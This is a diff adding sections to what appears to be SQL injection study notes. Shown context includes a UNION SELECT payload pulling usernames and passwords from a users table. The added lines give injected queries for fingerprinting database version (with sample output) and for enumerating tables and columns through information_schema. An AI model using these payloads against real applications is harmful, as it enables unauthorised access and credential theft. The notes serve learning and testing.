@@ -33,3 +33,20 @@ Also it's important to note that on MySQL databases, the `--` comment sequence m
 `UNION SELECT username ||'~'|| password FROM users`
 * Output : `admin~~1337`
 #### The double-pipe sequence `||` is a string concatenation operator on Oracle and other databases and the '~' char is used to separate the data.
+# Querying the database type and version
+#### To potentially identify the database type and version, we can inject provider-specific queries to check their compatibility and determine if any of them yield results.
+* Queries to determine the database version on different database types:
+  *  Oracle: ` SELECT * from v$version`
+  * PostgresSQL: ` SELECT version()`
+  * Microsoft, MySQL: `SELECT @@version`
+* Example: On MySQL \
+` UNION SELECT @@version--` \
+* Output: `8.0.36.0ubuntu0.20.04.1`
+# Listing the contents of the database
+#### In the realm of databases, many types (with the exception of Oracle) feature a collection of views known as the information schema. This schema serves as a valuable resource for retrieving details about the structure of the database.
+* Example: For instance, one can use the following query to obtain a list of tables within the database 
+  * `SELECT * FROM information_schema.tables`
+* To delve deeper into the structure of individual tables, one can query `information_schema.columns` , specifying the desired table .
+  * Example: `SELECT * FROM information_schema.columns WHERE table_name='Users'`
+
+
